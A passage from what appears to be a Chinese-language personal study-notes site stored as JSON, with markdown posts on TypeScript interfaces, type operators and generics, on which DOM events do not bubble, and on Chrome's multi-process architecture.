SearchFunc {\n    (source: string, subString: string): boolean;\n}\n\nconst mySearch: SearchFunc = function(src: string, sub: string): boolean {\n    return src.search(sub) > -1;\n}\n```\n\n## 5. 类类型接口\n\n接口可以强制类遵循特定的契约：\n\n```typescript\ninterface ClockInterface {\n    currentTime: Date;\n    setTime(d: Date): void;\n}\n\nclass Clock implements ClockInterface {\n    currentTime: Date = new Date();\n    setTime(d: Date) {\n        this.currentTime = d;\n    }\n}\n```\n\n## 6. 继承接口\n\n接口可以**相互继承**：自己继承自己\n\n```typescript\ninterface Shape {\n    color: string;\n}\n\ninterface Square extends Shape {\n    sideLength: number;\n}\n\nconst square: Square = {\n    color: \"blue\",\n    sideLength: 10\n}\n```\n\n## 7. 混合类型接口\n\n一个对象可以**同时作为函数和对象使用**：\n\n```typescript\ninterface Counter {\n    (start: number): string;\n    interval: number;\n    reset(): void;\n}\n\nfunction getCounter(): Counter {\n    let counter = function(start: number) {} as Counter;\n    counter.interval = 123;\n    counter.reset = function() {};\n    return counter;\n}\n```\n\n## 8. 索引签名\n\n可以描述可以额外拥有其他属性的对象：\n\n```typescript\ninterface StringArray {\n    [index: number]: string;\n}\n\ninterface Dictionary {\n    [key: string]: any;\n}\n\nconst myArray: StringArray = [\"Bob\", \"Fred\"];\nconst myDict: Dictionary = {\n    name: \"张三\",\n    age: 25,\n    isStudent: true\n};\n```\n\n## 9. 接口合并\n\nTypeScript 允许你声明多个同名接口，它们会**自动合并**：\n\n```typescript\ninterface Box {\n    height: number;\n}\n\ninterface Box {\n    width: number;\n}\n\n// 等同于：\n// interface Box {\n//     height: number;\n//     width: number;\n// }\n\nconst box: Box = { height: 5, width: 6 };\n```\n\n## 10. 实用技巧\n\n### 10.1. 接口继承类：**同时使用 extends 和 implements**\n\n```typescript\nclass Control {\n    private state: any;\n}\n\ninterface SelectableControl extends Control {\n    select(): void;\n}\n\nclass Button extends Control implements SelectableControl {\n    select() {}\n}\n```\n\n### 10.2. ==可选方法==：和可选属性一样\n\n```typescript\ninterface EventListener {\n    onClick?(): void;\n    onMouseOver?(): void;\n}\n```\n\n### 10.3. readonly 数组\n\n```typescript\ninterface ReadonlyStringArray {\n    readonly [index: number]: string;\n}\n```\n\n## 11. 最佳实践\n\n### 11.1. **命名约定**：\n\n   - 接口名通常以大写字母 `I` 开头（虽然不是必须的）\n   - 使用 `PascalCase` 命名方式\n\n### 11.2. **接口分离原则**：\n\n   - 保持接口小而精确\n   - **一个接口只负责一个功能域**\n\n```typescript hl:12\n// 好的实践\ninterface IUser {\n    id: number;\n    name: string;\n}\n\ninterface IUserActions {\n    updateName(newName: string): void;\n    deleteUser(): void;\n}\n\n// 而不是\ninterface IUserWithActions {\n    id: number;\n    name: string;\n    updateName(newName: string): void;\n    deleteUser(): void;\n}\n```\n\n### 11.3. **使用泛型接口**：\n\n```typescript\ninterface IResponse<T> {\n    data: T;\n    status: number;\n    message: string;\n}\n\n// 使用\ninterface IUser {\n    name: string;\n    email: string;\n}\n\nconst response: IResponse<IUser> = {\n    data: { name: \"张三\", email: \"zhangsan@example.com\" },\n    status: 200,\n    message: \"success\"\n};\n```\n\n> ==范型接口，很有用的==\n\n## 12. 注意事项\n\n1. 接口不会生成 JavaScript 代码，它们只在编译时用于类型检查。\n\n2. 接口可以**描述 JavaScript 中不存在的类型**，如联合类型：\n```typescript\ninterface Result {\n    success: boolean;\n    error?: string | Error;\n}\n```\n\n3. 实现接口时，必须严格遵守接口定义的结构：\n```typescript\ninterface Vehicle {\n    brand: string;\n    model: string;\n}\n\n// 错误：缺少必需的属性\nconst car: Vehicle = {\n    brand: \"Toyota\"\n}; // 类型错误！\n\n// 正确\nconst car: Vehicle = {\n    brand: \"Toyota\",\n    model: \"Camry\"\n};\n```\n\n## 13. 高级用法\n\n### 13.1. 映射类型与接口\n\n```typescript hl:7,10\ninterface Person {\n    name: string;\n    age: number;\n}\n\n// 创建所有属性可选的新接口\ntype PartialPerson = Partial<Person>;\n\n// 创建所有属性只读的新接口\ntype ReadonlyPerson = Readonly<Person>;\n```\n\n### 13.2. 条件类型与接口\n\n```typescript\ninterface Animal {\n    live(): void;\n}\n\ninterface Dog extends Animal {\n    woof(): void;\n}\n\ntype Example1 = Dog extends Animal ? number : string; // type Example1 = number\n```\n\n","GxHTkz7P":"\n# Interface 中的运算符操作\n\n`#typescript` \n\n\n## 目录\n<!-- toc -->\n ## 1. `交叉类型`运算符 (&) ，需要配合 type 的 `&` \n\n交叉类型运算符 `&` 用于**组合多个类型为一个类型**，包含了所有类型的特性：\n\n```typescript hl:17\ninterface BusinessPartner {\n    name: string;\n    credit: number;\n}\n\ninterface Identity {\n    id: number;\n    email: string;\n}\n\ninterface Contact {\n    phone: string;\n    address: string;\n}\n\n// 使用交叉类型组合接口\ntype Employee = Identity & BusinessPartner & Contact;\n\n// 使用组合后的类型\nconst employee: Employee = {\n    id: 100,\n    email: \"john@example.com\",\n    name: \"John Doe\",\n    credit: 1000,\n    phone: \"123-456-7890\",\n    address: \"123 Main St\"\n};\n```\n\n## 2. `联合类型`运算符 (|)\n\n联合类型运算符 `|` 表示一个值可以是几种类型之一：\n\n```typescript\ninterface Bird {\n    fly(): void;\n    layEggs(): void;\n}\n\ninterface Fish {\n    swim(): void;\n    layEggs(): void;\n}\n\n// 联合类型\ntype Pet = Bird | Fish;\n\nfunction getPet(): Pet {\n    // 返回的可以是 Bird 或 Fish\n    return {\n        swim: () => console.log(\"Swimming...\"),\n        layEggs: () => console.log(\"Laying eggs...\")\n    };\n}\n```\n\n## 3. 类型映射运算符\n\n### 3.1. `Partial<T>` ，包装过的泛型\n\n使所有属性变为可选：\n\n```typescript\ninterface User {\n    name: string;\n    age: number;\n    email: string;\n}\n\n// 所有属性都变为可选\ntype PartialUser = Partial<User>;\n// 等价于：\n// {\n//     name?: string;\n//     age?: number;\n//     email?: string;\n// }\n```\n\n### 3.2. `Required<T>`，包装过的泛型\n\n使所有属性变为必需：\n\n```typescript\ninterface Config {\n    name?: string;\n    age?: number;\n}\n\n// 所有属性都变为必需\ntype RequiredConfig = Required<Config>;\n// 等价于：\n// {\n//     name: string;\n//     age: number;\n// }\n```\n\n### 3.3. `Readonly<T>`，包装过的泛型\n\n使所有属性只读：\n\n```typescript\ninterface Mutable {\n    name: string;\n    value: number;\n}\n\n// 所有属性变为只读\ntype Immutable = Readonly<Mutable>;\n// 等价于：\n// {\n//     readonly name: string;\n//     readonly value: number;\n// }\n```\n\n## 4. 条件类型运算符\n\n使用 `extends` 关键字进行条件类型判断：\n\n```typescript\ntype ExtractType<T> = T extends string ? string : number;\n\n// 根据条件返回不同的类型\ntype StringType = ExtractType<string>;  // string\ntype NumberType = ExtractType<number>;  // number\n```\n\n## 5. 键类型运算符\n\n### 5.1. keyof\n\n获取对象类型的所有键：\n\n```typescript\ninterface Person {\n    name: string;\n    age: number;\n    address: string;\n}\n\n// 获取所有键\ntype PersonKeys = keyof Person; // \"name\" | \"age\" | \"address\"\n\n// 实际应用\nfunction getProperty<T, K extends keyof T>(obj: T, key: K): T[K] {\n    return obj[key];\n}\n```\n\n### 5.2. `Pick<T, K>`\n\n从类型中**选择部分属性**：\n\n```typescript\ninterface Todo {\n    title: string;\n    description: string;\n    completed: boolean;\n}\n\n// 只选择部分属性\ntype TodoPreview = Pick<Todo, \"title\" | \"completed\">;\n// 等价于：\n// {\n//     title: string;\n//     completed: boolean;\n// }\n```\n\n### 5.3. `Omit<T, K>`\n\n从类型中**排除某些属性**：\n\n```typescript\ninterface User {\n    id: number;\n    name: string;\n    password: string;\n}\n\n// 排除敏感信息\ntype PublicUser = Omit<User, \"password\">;\n// 等价于：\n// {\n//     id: number;\n//     name: string;\n// }\n```\n\n## 6. 高级运算符组合\n\n可以组合多个运算符来创建复杂的类型：\n\n```typescript\ninterface User {\n    id: number;\n    name: string;\n    email: string;\n    password: string;\n}\n\n// 组合多个类型运算符\ntype PartialPublicUser = Partial<Omit<User, \"password\">>;\n// 等价于：\n// {\n//     id?: number;\n//     name?: string;\n//     email?: string;\n// }\n```\n\n## 7. `Record<K, T>`\n\n创建具有指定**键类型和值类型**的对象类型：\n\n```typescript\ntype PageInfo = {\n    title: string;\n    url: string;\n}\n\n// 创建字符串索引的对象类型\ntype Pages = Record<string, PageInfo>;\n\nconst pages: Pages = {\n    home: { title: \"Home\", url: \"/\" },\n    about: { title: \"About\", url: \"/about\" }\n};\n```\n\n","0ZHKMxWs":"\n# TypeScript 中与类型相关的运算符\n\n`#typescript` `#R1` \n\n\n## 目录\n<!-- toc -->\n ## 1. 类型查询运算符 `typeof` \n\n用于获取变量或表达式的类型：\n\n```typescript\nlet str = \"Hello\";\ntype StrType = typeof str; // string\n\nconst user = { name: \"Alice\", age: 25 };\ntype User = typeof user; // { name: string; age: number; }\n```\n\n## 2. 键值查询运算符 `keyof`\n\n获取类型的所有键组成的联合类型：\n\n```typescript\ninterface Person {\n    name: string;\n    age: number;\n}\ntype PersonKeys = keyof Person; // \"name\" | \"age\"\n```\n\n## 3. 索引访问类型 `T[K]`\n\n访问类型中的特定属性类型：\n\n```typescript\ninterface Person {\n    name: string;\n    age: number;\n}\ntype AgeType = Person[\"age\"]; // number\n```\n\n## 4. 条件类型\n\n### 4.1. extends\n\n```typescript\ntype Check<T> = T extends string ? \"是字符串\" : \"不是字符串\";\ntype Result = Check<\"hello\">; // \"是字符串\"\n```\n\n### 4.2. `infer` ? 没用过\n\n```typescript\ntype GetReturnType<T> = T extends (...args: any[]) => infer R ? R : never;\ntype Func = () => number;\ntype ReturnType = GetReturnType<Func>; // number\n```\n\n## 5. 映射类型修饰符\n\n```typescript\ninterface Person {\n    name: string;\n    age: number;\n}\n\n// 所有属性变为可选\ntype Optional<T> = {\n    [K in keyof T]?: T[K];\n};\n\n// 所有属性变为只读\ntype Readonly<T> = {\n    readonly [K in keyof T]: T[K];\n};\n```\n\n## 6. 类型组合：联合类型 和 交叉类型\n\n```typescript\n// 联合类型\ntype StringOrNumber = string | number;\n\n// 交叉类型\ntype A = { name: string };\ntype B = { age: number };\ntype C = A & B; // { name: string; age: number }\n```\n\n## 7. 类型断言\n\n```typescript hl:7\n// as 断言\nlet value: any = \"string\";\nlet length = (value as string).length;\n\n// 非空断言\nfunction getName(name?: string) {\n    return name!.toUpperCase(); // 断言 name 一定存在\n}\n\n\nlet value: any = \"hello\";\nlet length: number = (value as string).length;\n// 或使用尖括号语法\nlet length2: number = (<string>value).length;\n```\n\n### 7.1. 非空断言运算符 (!)\n\n```typescript hl:4\nfunction getValue(): string | undefined {\n    return \"hello\";\n}\nconst value = getValue()!; // 断言值不为 null 或 undefined\n```\n\n## 8. 实用运算符\n\n```typescript\n// in 操作符\ntype Keys = \"x\" | \"y\";\ntype Point = {\n    [K in Keys]: number;\n}; // { x: number; y: number }\n\n// 可选链\ninterface User {\n    address?: {\n        street?: string;\n    }\n}\nconst street = user?.address?.street;\n```\n\n## 9. 条件类型运算符\n\n### 9.1. extends 条件类型\n\n用于创建基于条件的类型：\n\n```typescript\ntype IsString<T> = T extends string ? true : false;\ntype Result1 = IsString<\"hello\">; // true\ntype Result2 = IsString<42>; // false\n```\n\n### 9.2. infer 关键字\n\n用于在条件类型中推断类型：\n```typescript\ntype ReturnType<T> = T extends (...args: any[]) => infer R ? R : never;\n```\n\n## 10. 映射类型修饰符\n\n### 10.1. 只读和可选修饰符\n\n```typescript\ntype Readonly<T> = {\n    readonly [P in keyof T]: T[P];\n};\n\ntype Partial<T> = {\n    [P in keyof T]?: T[P];\n};\n```\n\n### 10.2. 添加和移除修饰符\n\n使用 `+` 和 `-` 来添加或移除 `readonly` 和 `? 修饰符`：\n```typescript\ntype MutableRequired<T> = {\n    -readonly [P in keyof T]-?: T[P];\n};\n```\n\n## 11. 索引类型操作符\n\n### 11.1. 索引访问类型 (`[]`)\n\n```typescript\ninterface Person {\n    name: string;\n    age: number;\n}\ntype AgeType = Person[\"age\"]; // number\n```\n\n### 11.2. 索引签名\n\n```typescript\ninterface StringMap {\n    [key: string]: string;\n}\n```","iRjEZCu5":"\n# TypeScript 的泛型（Generics）\n\n`#typescript` `#R1` \n\n\n## 目录\n<!-- toc -->\n ## 1. 泛型基础 \n\n泛型是一种**在定义函数、接口或类时不预先指定具体类型，而在使用时再指定类型的特性**。\n\n> 个人理解是：类比一个函数，可以传入参数，来确定这个接口、函数、或类的具体类型\n\n### 1.1. 基本语法\n\n泛型使用尖括号 `<T>` 来定义，其中 `T` 是一个类型变量：\n\n```typescript\n// 泛型函数\nfunction identity<T>(arg: T): T {\n    return arg;\n}\n\n// 使用方式 1\nlet output1 = identity<string>(\"hello\");  // 显式指定类型\nlet output2 = identity(\"hello\");          // 类型推断\n\n\n// 使用方式 2\nlet output1 = identity<string>(\"myString\");\nlet output2 = identity(123); // 类型推断为 number\n```\n\n### 1.2. 泛型接口\n\n```typescript\ninterface GenericIdentityFn<T> {\n    (arg: T): T;\n}\n\nlet myIdentity: GenericIdentityFn<number> = (arg: number): number => {\n    return arg;\n};\n\n\ninterface Collection<T> {\n    add(item: T): void;\n    remove(item: T): void;\n    getItems(): T[];\n}\n```\n\n## 2. 泛型类\n\n```typescript\nclass GenericNumber<T> {\n    zeroValue: T;\n    add: (x: T, y: T) => T;\n    \n    constructor(zero: T, addFn: (x: T, y: T) => T) {\n        this.zeroValue = zero;\n        this.add = addFn;\n    }\n}\n\n// 使用示例\nconst numCalculator = new GenericNumber<number>(0, (x, y) => x + y);\nconst strCalculator = new GenericNumber<string>('', (x, y) => x + y);\n```\n\n## 3. 泛型约束\n\n### 3.1. 使用 `extends` 关键字来约束泛型\n\n```typescript\ninterface Lengthwise {\n    length: number;\n}\n\nfunction logLength<T extends Lengthwise>(arg: T): void {\n    console.log(arg.length);\n}\n\n// 正确\nlogLength(\"hello\");           // 字符串有 length 属性\nlogLength([1, 2, 3]);         // 数组有 length 属性\nlogLength({ length: 10 });    // 对象有 length 属性\n\n// 错误\n// logLength(3);              // 数字没有 length 属性\n```\n\n### 3.2. 在泛型约束中使用类型参数\n\n```typescript\nfunction getProperty<T, K extends keyof T>(obj: T, key: K): T[K] {\n    return obj[key];\n}\n\nlet obj = { a: 1, b: 2, c: 3 };\ngetProperty(obj, \"a\");  // 正确\n// getProperty(obj, \"z\");  // 错误：z 不是 obj 的属性\n\n\nlet x = { a: 1, b: 2, c: 3 };\ngetProperty(x, \"a\"); // 正确\ngetProperty(x, \"d\"); // 错误：参数 'd' 不存在于 'a' | 'b' | 'c' 中\n```\n\n## 4. 多个类型参数\n\n```typescript\nfunction pair<T, U>(first: T, second: U): [T, U] {\n    return [first, second];\n}\n\nconst p1 = pair<string, number>(\"hello\", 42);\nconst p2 = pair(\"world\", true);  // 类型推断\n\n\n// 在类中使用多个类型参数\nclass KeyValuePair<TKey, TValue> {\n    constructor(\n        public key: TKey,\n        public value: TValue\n    ) {}\n}\n```\n\n## 5. 常用的泛型工具类型\n\nTypeScript 提供了几个**常用的泛型工具类型**\n\n```typescript\n// Partial - 使所有属性可选\ntype Partial<T> = {\n    [P in keyof T]?: T[P];\n};\n\n// Readonly - 使所有属性只读\ntype Readonly<T> = {\n    readonly [P in keyof T]: T[P];\n};\n\n// Pick - 从类型中选择部分属性\ntype Pick<T, K extends keyof T> = {\n    [P in K]: T[P];\n};\n\n// Record - 创建具有特定类型属性的类型\ntype Record<K extends keyof any, T> = {\n    [P in K]: T;\n};\n```\n\n下面分开介绍\n\n### 5.1. `Partial<T>`\n\n将类型的所有属性变为**可选**：\n\n```typescript\ninterface Todo {\n    title: string;\n    description: string;\n}\n\ntype PartialTodo = Partial<Todo>;\n// 等价于：\n// {\n//    title?: string;\n//    description?: string;\n// }\n```\n\n### 5.2. `Record<K,T>`\n\n创建一个键类型为 K，值类型为 T 的对象类型：\n\n```typescript\ntype PageInfo = {\n    title: string;\n}\n\ntype Page = \"home\" | \"about\" | \"contact\";\n\nconst nav: Record<Page, PageInfo> = {\n    home: { title: \"Home\" },\n    about: { title: \"About\" },\n    contact: { title: \"Contact\" }\n};\n```\n\n### 5.3. `Pick<T,K>` 和 `Omit<T,K>`\n\n```typescript\ninterface Todo {\n    title: string;\n    description: string;\n    completed: boolean;\n}\n\ntype TodoPreview = Pick<Todo, \"title\" | \"completed\">;\n// 等价于：{ title: string; completed: boolean; }\n\ntype TodoInfo = Omit<Todo, \"completed\">;\n// 等价于：{ title: string; description: string; }\n```\n\n## 6. 实际应用示例\n\n### 6.1. 泛型组件（React 示例）\n\n```typescript\ninterface ListProps<T> {\n    items: T[];\n    renderItem: (item: T) => React.ReactNode;\n}\n\nfunction List<T>(props: ListProps<T>) {\n    return (\n        <div>\n            {props.items.map((item, index) => (\n                <div key={index}>\n                    {props.renderItem(item)}\n                </div>\n            ))}\n        </div>\n    );\n}\n```\n\n### 6.2. 泛型 API 请求\n\n```typescript\nasync function fetchData<T>(url: string): Promise<T> {\n    const response = await fetch(url);\n    return response.json();\n}\n\ninterface User {\n    id: number;\n    name: string;\n}\n\n// 使用\nconst user = await fetchData<User>('/api/user');\n```\n\n>  这个很常用！！！\n\n## 7. 最佳实践\n\n### 7.1. **命名约定**\n\n- T 用于表示第一个类型参数\n- K 通常用于表示对象的键类型\n- V 用于表示对象的值类型\n- E 用于表示元素类型\n- 使用单个大写字母作为简单泛型类型参数（T, U, V）\n- 对于更复杂的场景，使用有描述性的名称（TKey, TValue, TEntity）\n\n```typescript\nfunction map<TInput, TOutput>(\n    array: TInput[], \n    fn: (item: TInput) => TOutput\n): TOutput[] {\n    return array.map(fn);\n}\n```\n\n### 7.2. **默认类型参数**\n\n```typescript\ninterface DefaultGeneric<T = string> {\n    value: T;\n}\n\nconst stringValue: DefaultGeneric = { value: \"hello\" };\nconst numberValue: DefaultGeneric<number> = { value: 42 };\n```\n\n### 7.3. **泛型约束的组合**\n\n```typescript\ninterface HasId {\n    id: number;\n}\n\ninterface HasName {\n    name: string;\n}\n\nfunction processThing<T extends HasId & HasName>(thing: T) {\n    console.log(thing.id, thing.name);\n}\n\nfunction findById<T extends HasId>(items: T[], id: number): T | undefined {\n    return items.find(item => item.id === id);\n}\n```\n\n## 8. 高级用法\n\n### 8.1. 条件类型与泛型\n\n```typescript\ntype NonNullable<T> = T extends null | undefined ? never : T;\n\ntype ExtractType<T> = T extends string \n    ? 'string'\n    : T extends number\n    ? 'number'\n    : 'other';\n```\n\n### 8.2. 映射类型与泛型\n\n```typescript\ntype Optional<T> = {\n    [K in keyof T]?: T[K];\n};\n\ntype Nullable<T> = {\n    [K in keyof T]: T[K] | null;\n};\n```\n\n## 9. 最后\n\n泛型是 TypeScript 中最强大的特性之一，它可以：\n\n- 提供类型安全性\n- 增加代码重用性\n- 使代码更加灵活\n- 减少重复代码\n\n通过合理使用泛型，我们可以编写出更加通用和类型安全的代码。在实际开发中，泛型经常用于：\n- 容器类的实现\n- 工具函数的编写\n- API 请求的类型定义\n- UI 组件的属性定义\n\n","w3RIJnoc":"\n# 前言\n\n\n> 浏览器相关：包括DOM、BOM、浏览器渲染原理、开发者工具等\n\n\n## 目录\n<!-- toc -->\n ## BOM 篇 \n\n- [1. 哪些事件不会冒泡的事件，以及为什么不支持冒泡？](/post/7cRlGnSu.html)\n- [2. 使用 requestAnimationFrame 批量处理操作的原理](/post/vCdo8uDh.html)\n- [3. MessageChannel](/post/RIOoYtCK.html)\n- [4. 如何检测页面是否在前台运行](/post/sU2vY2Yf.html)\n- [5. 为什么要用 setTimeout 模拟 setInterval ？](/post/zbgylJlz.html)\n- [6. 浏览器本地如何读取并处理本地大文件](/post/lVxlSvqC.html)\n- [7. WebAssembly (Wasm)](/post/Ohuh7Fgf.html)\n- [11. requestIdleCallback](/post/cd0Ts8oL.html)\n\n## DOM 篇\n\n\n## 浏览器渲染原理篇\n\n- [8. 浏览器的渲染原理](/post/MLGEykBV.html)\n- [10. 现代 Chrome 浏览器架构设计](/post/Pq0GzBjX.html)\n\n## 开发者工具\n\n> 整理所有关于开发这工具的一切！\n\n### CSS \n\n- 计算样式：在“元素”面板中，查看元素的计算样式，了解最终应用的样式值。\n- 盒模型：查看元素的盒模型，了解元素的尺寸、边距、边框和内边距。\n- CSS 断点：在“源代码”面板中，设置样式表断点，当样式表被修改时，代码会暂停执行，帮助定位问题。\n- 元素检查：右键点击页面元素，选择“检查”或按 F12 打开开发者工具，查看和修改元素的 CSS 样式。\n- 实时编辑：在“元素”面板中，直接编辑 CSS 规则，实时查看效果。\n- 样式层叠：查看元素的所有样式，包括用户代理样式、外部样式表、内联样式等，理解样式的层叠和优先级。\n\n### HTML\n\n### JavaScript\n\n- [9. 浏览器中如何查找内存泄漏](/post/xyGXILev.html)\n- 实时修改代码 ：`Shift+Enter` 你可以尝试搭配使用 Shift+Enter 按键去输入多行代码\n\n","7cRlGnSu":"\n# 哪些事件不会冒泡的事件，以及为什么不支持冒泡？\n\n\n`#dom` `#bom` `#R1` \n\n\n## 目录\n<!-- toc -->\n ## 1. 事件传播的三个阶段 \n\n事件传播分为三个阶段：\n\n```javascript\n// 事件传播示意\n/*\n1. 捕获阶段（Capturing Phase）：从顶层元素向下传播\n2. 目标阶段（Target Phase）：到达目标元素\n3. 冒泡阶段（Bubbling Phase）：从目标元素向上传播\n*/\n\ndocument.addEventListener('click', function(e) {\n    console.log('捕获阶段');\n}, true); // 第三个参数 true 表示在捕获阶段处理\n\nelement.addEventListener('click', function(e) {\n    console.log('目标阶段');\n});\n\ndocument.addEventListener('click', function(e) {\n    console.log('冒泡阶段');\n}, false); // 默认是冒泡阶段\n```\n\n## 2. 不冒泡的事件列表\n\n以下事件不会冒泡：\n\n- a) 焦点事件：\n\t- `focus`  \n\t\t- 如果 focus 冒泡，当输入框获得焦点时，所有父元素都会收到通知\n\t\t- ==额外的性能开销==\n\t- blur\n- b) 资源事件： → ==加载完了，没必要再冒泡了==\n\t- load\n\t- unload\n\t- abort\n\t- error\n- c) 鼠标事件： ==enter 和 leave==  →  逻辑合理性，不然矛盾了\n\t- `mouseenter`\n\t- `mouseleave`\n- d) 媒体事件：\n\t- pause\n\t- play\n\t- playing\n\t- ended\n\t- volumechange\n\t- stalled\n\n> 这些事件**只在目标元素上触发**\n\n示例代码：\n\n```javascript\n// 焦点事件示例\ndocument.querySelector('input').addEventListener('focus', function(e) {\n    console.log('Input focused');\n    console.log('这个事件不会冒泡到父元素');\n});\n\n// mouseenter/mouseleave vs mouseover/mouseout\nconst parent = document.querySelector('.parent');\nconst child = document.querySelector('.child');\n\n// mouseenter 不冒泡\nparent.addEventListener('mouseenter', () => {\n    console.log('Parent mouseenter'); // 只在真正进入父元素时触发一次\n});\n\n// mouseover 会冒泡\nparent.addEventListener('mouseover', () => {\n    console.log('Parent mouseover'); // 进入子元素时也会触发\n});\n```\n\n## 3. 为什么某些事件不冒泡？\n\n主要有以下几个原因：\n\n### 3.1. 性能考虑\n\n```javascript hl:8\n// 想象如果 focus 事件冒泡会发生什么\n<div>\n    <div>\n        <input id=\"myInput\" />\n    </div>\n</div>\n\n// 如果 focus 冒泡，当输入框获得焦点时，所有父元素都会收到通知\n// 这会导致不必要的性能开销\n```\n\n### 3.2. 逻辑合理性\n\n```javascript hl:7\n// 以 mouseenter 为例\n<div class=\"parent\">\n    <div class=\"child\"></div>\n</div>\n\n// mouseenter 不冒泡是合理的，因为：\n// 1. 从 parent 进入 child 时，鼠标实际上并没有\"进入\"父元素\n// 2. 如果冒泡，会导致父元素重复触发 mouseenter 事件\n```\n\n### 3.3. 事件本身的特性\n\n```javascript hl:4\n// 例如 load 事件\n<img src=\"example.jpg\" onload=\"handleLoad()\">\n\n// load 事件表示资源加载完成\n// 这是一个一次性的状态变化，没有必要向上冒泡\n```\n\n## 4. 如何处理不冒泡的事件\n\n### 4.1. 使用捕获阶段\n\n```javascript\n// 如果确实需要在父元素捕获子元素的 focus 事件\nparent.addEventListener('focus', function(e) {\n    console.log('Focus captured');\n}, true); // 使用捕获阶段\n```\n\n### 4.2. 使用替代事件\n\n```javascript hl:2\n// 使用 focusin/focusout 代替 focus/blur\n// focusin/focusout 是会冒泡的\nelement.addEventListener('focusin', function(e) {\n    console.log('Focus detected');\n});\n```\n\n### 4.3. 事件委托的替代方案\n\n#### 4.3.1. 对于不冒泡的事件，可以使用 `MutationObserver` 来监听\n\n```javascript\n// 对于不冒泡的事件，可以使用 MutationObserver\nconst observer = new MutationObserver((mutations) => {\n    mutations.forEach((mutation) => {\n        if (mutation.type === 'attributes' && mutation.attributeName === 'focused') {\n            // 处理焦点变化\n        }\n    });\n});\n\nobserver.observe(element, {\n    attributes: true,\n    attributeFilter: ['focused']\n});\n```\n\n## 5. 最佳实践\n\n### 5.1. 选择合适的事件\n\n```javascript hl:6\n// 不好的实践\ndocument.addEventListener('mouseenter', function(e) {\n    // 试图通过事件委托处理子元素的 mouseenter\n}, false);\n\n// 好的实践\ndocument.addEventListener('mouseover', function(e) {\n    // 使用冒泡事件实现类似功能\n}, false);\n```\n\n### 5.2. 使用事件委托时注意\n\n```javascript\n// 正确的事件委托\ndocument.addEventListener('click', function(e) {\n    if (e.target.matches('.button')) {\n        // 处理按钮点击\n    }\n});\n\n// 对于不冒泡的事件，直接绑定到目标元素\ndocument.querySelectorAll('input').forEach(input => {\n    input.addEventListener('focus', handleFocus);\n});\n```\n\n## 6. 检测事件是否冒泡\n\n```javascript hl:7,11\n// 检测事件是否冒泡\nfunction isEventBubbling(eventName) {\n    const element = document.createElement('div');\n    let bubbles = false;\n    \n    element.addEventListener(eventName, function(e) {\n        bubbles = e.bubbles;\n    });\n    \n    // 触发事件\n    const event = new Event(eventName, {\n        bubbles: true,\n        cancelable: true\n    });\n    element.dispatchEvent(event);\n    \n    return bubbles;\n}\n\n// 使用示例\nconsole.log(isEventBubbling('click')); // true\nconsole.log(isEventBubbling('focus')); // false\n```\n\n","Pq0GzBjX":"\n# 现代 Chrome 浏览器架构设计\n\n`#bom` `#浏览器` \n\n\n## 目录\n<!-- toc -->\n ## 1. 关键点 \n\n- 主进程：\n- 渲染进程\n\t- 主线程：\n\t\t- ==单线程==，js html css等\n\t- worker 线程\n\t- 合成线程\n\t- 光栅线程\n\t- 定时器线程\n\t- 事件线程\n\t- 垃圾回收线程\n\t- 调试器线程\n\n## 2. Chrome 多进程架构：浏览器的 6 个主要进程\n\n1. 浏览器==主进程 / UI 进程==（Browser Process）：\n\t- 负责管理用户界面、地址栏、书签栏等，以及协调其他进程\n2. **渲染进程（Renderer Process）**：==负责将HTML、CSS和JavaScript 转换为用户可以交互的网页==\n\t- 渲染进程负责站点的渲染，其中也包括 `JavaScript 代码的运行`，`web worker` 的管理等\n\t- 核心任务是将 ` HTML、CSS 和 JavaScript` 转换为用户可以与之交互的网页\n\t\t- 排版引擎Blink和JavaScript引擎V8都是运行在该进程\n3. 插件进程：扩展进程（Extension Process）\n\t- 运行网页插件，如Flash\n\t- 运行浏览器扩展\n4. GPU 进程：\n\t- 处理GPU相关的任务，加速网页渲染\n5. 网络进程（Network Process）：处理网络请求\n\t- Chrome有个机制，**同一个域名同时**`最多只能建立 6 个TCP连接`，\n\t\t- 如果在同一个域名下同时有10个请求发生，那么其中 4个请求会进入排队等待状态，直至进行中的请求完成\n\n## 3. 在每个渲染进程中，又包含多个线程\n\n- 主线程：执行 JavaScript，处理 DOM、CSS 等\n\t- JavaScript 主要在渲染进程的**主线程**上执行，所以长时间运行的 JavaScript 会阻塞页面渲染\n- 工作线程（`Worker` Thread）：\n\t- 执行 Web Worker 或  Service Worker。 \n- 合成线程（`Compositor` Thread）：\n\t- 负责将页面各个部分合成为最终显示的图像。\n- 光栅线程（`Raster` Thread）：\n\t- 将页面元素转换为位图\n\n## 4. Chrome 的 4 种进程模型\n\nChrome有四种进程模型，默认使用的是 `Process-per-site-instance 模型`\n\n- 同一站点（相同协议和域名）的多个标签页通常会**共用一个渲染进程**\n- 不同站点的标签页会使用**不同的渲染进程**\n\n其他的还有\n- Process-per-site\n- Process-per-tab\n- Single Process\n\nChrome会根据系统的资源情况**动态调整**进程的分配：\n- 在资源充足的系统上，它可能会**为每个标签页分配独立的进程**。\n- 在资源受限的系统上，它可能会**合并一些进程以节省资源**\n\nChrome 允许用户或管理员通过**命令行参数**来选择不同的进程模型\n\n## 5. Chrome 常见的**线程**\n\nChrome 采用**多进程多线程架构**，每个进程内部都有多个线程协同工作。以下是一些主要的线程：\n\n- **主线程（Main thread）**：\n\t- 负责处理大部分的渲染工作，包括 DOM 树的构建、样式计算、布局计算等。\n\t- 执行 JavaScript 代码。\n\t- 处理用户交互事件。\n- 合成线程（Compositor thread）：\n\t- 负责将页面的各个部分合成为最终显示的图像。\n\t- 处理一些与滚动相关的操作，提高页面滚动的流畅度。\n- 渲染线程（Renderer thread）：\n\t- 在 Renderer 进程中，负责页面渲染的主要工作。\n\t- 与主线程密切协作，处理页面的可视化呈现。\n- IO 线程：\n\t- 负责处理==文件系统操作和网络请求==\n\t- 在浏览器主进程和渲染进程中都存在 IO 线程\n- 工作线程（Worker threads）：\n\t- 用于执行 `Web Workers`，允许在后台运行 JavaScript 代码而不影响主线程。\n- 光栅化线程（Raster threads）：\n\t- 负责将页面的各个部分转换为位图。\n\t- 通常有多个光栅化线程并行工作，以提高性能。\n- GPU 线程：\n\t- 在 GPU 进程中，负责与 GPU 硬件交互，加速图形渲染。\n- 网络线程：\n\t- 在网络进程中，处理所有的网络请求和响应。\n\t  - 比如`Ajax`请求、Fetch等都是\n- **定时器线程**：\n\t- 记住，浏览器的`setInterval`和`setTimeout`不是js引擎里的，而`是浏览器自己开了个线程来处理`\n\t- 负责处理 `setTimeout` 和 `setInterval` 等计时器功能。\n- **事件触发线程**：\n    - 